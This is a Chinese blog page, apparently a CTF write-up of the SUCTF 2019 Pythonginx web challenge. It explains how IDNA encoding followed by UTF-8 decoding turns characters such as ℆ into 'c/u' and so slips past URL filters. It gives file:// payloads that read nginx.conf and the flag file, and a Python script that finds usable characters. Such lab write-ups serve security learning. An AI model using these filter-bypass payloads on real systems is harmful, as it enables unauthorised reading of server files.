@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="利用点 nginx文件配置 idna与utf-8编码漏洞  背景知识nginx文件配置12345678910111213配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;ng">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞">
+<meta property="og:url" content="http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="利用点 nginx文件配置 idna与utf-8编码漏洞  背景知识nginx文件配置12345678910111213配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;ng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-24T14:44:01.000Z">
+<meta property="article:modified_time" content="2022-04-24T14:51:24.103Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/25/BUUCTF-WEB-0CTF-2016-piapiapia-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87preg-match-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&text=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&is_video=false&description=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞&body=Check out this article: http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&name=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&t=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">nginx文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">idna与utf-8编码漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-24T14:44:01.000Z" itemprop="datePublished">2022-04-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><ol>
+<li>nginx文件配置</li>
+<li>idna与utf-8编码漏洞</li>
+</ol>
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="nginx文件配置"><a href="#nginx文件配置" class="headerlink" title="nginx文件配置"></a>nginx文件配置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line"></span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line"></span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line"></span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line"></span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br></pre></td></tr></table></figure>
+<h3 id="idna与utf-8编码漏洞"><a href="#idna与utf-8编码漏洞" class="headerlink" title="idna与utf-8编码漏洞"></a>idna与utf-8编码漏洞</h3><p><strong>什么是IDN?</strong><br>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p>
+<p><strong>什么是idna?</strong><br>支持 RFC 5891 中指定的应用程序中的国际化域名 (IDNA) 协议的库。该版本的协议通常被称为“IDNA2008”，并且可以产生与 2003 年早期标准不同的结果。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> idna</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(idna.encode(<span class="string">u&#x27;ドメイン.テスト&#x27;</span>))</span><br><span class="line">结果:xn--eckwd4c7c.xn--zckzah</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> idna.decode(<span class="string">&#x27;xn--eckwd4c7c.xn--zckzah&#x27;</span>)</span><br><span class="line">结果:ドメイン.テスト</span><br></pre></td></tr></table></figure>
+<p>Demo:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">℆这个字符,如果使用python3进行idna编码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;℆&#x27;</span>.encode(<span class="string">&#x27;idna&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line"><span class="string">b&#x27;c/u&#x27;</span></span><br><span class="line">如果再使用utf-<span class="number">8</span>进行解码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;c/u&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line">c/u</span><br></pre></td></tr></table></figure>
+<p>通过这种方法可以绕过网站的一些过滤字符.</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf <span class="comment">#拿到flag文件名</span></span><br><span class="line">file://suctf.c℆sr/fffffflag <span class="comment">#获取flag</span></span><br></pre></td></tr></table></figure>
+<p>查找字符脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:<span class="comment">#这里根据需要删除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115451137">https://blog.csdn.net/RABCDXB/article/details/115451137</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">nginx文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">idna与utf-8编码漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&text=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&is_video=false&description=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞&body=Check out this article: http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&name=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/&t=BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
